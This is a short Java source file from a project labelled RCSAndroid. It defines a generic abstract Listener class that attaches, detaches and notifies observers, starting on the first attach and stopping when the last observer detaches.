/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 20-apr-2011
 **********************************************/

package com.ht.RCSAndroidGUI.listener;

import java.util.Iterator;
import java.util.Stack;

import com.ht.RCSAndroidGUI.event.BatteryEvent;
import com.ht.RCSAndroidGUI.interfaces.Observer;

public abstract class Listener<U> {
	/** The Constant TAG. */
	private static final String TAG = "Listener";

	protected Stack<Observer<U>> observers;

	public Listener() {
		observers = new Stack<Observer<U>>();
	}

	public synchronized boolean attach(Observer<U> o) {
		// Object already in the stack
		if (observers.search(o) != -1)
			return false;

		if (observers.isEmpty()) {
			start();
		}

		observers.push(o);
		return true;
	}

	public synchronized void detach(Observer<U> o) {
		if (observers.empty())
			return;

		observers.remove(o);

		if (observers.isEmpty()) {
			stop();
		}
	}

	synchronized void dispatch(U elem){
		Iterator<Observer<U>> iter = observers.iterator();
		 
		while (iter.hasNext()) {
			iter.next().notification(elem);
		}
	}
	
	protected abstract void start();
	protected abstract void stop();
}
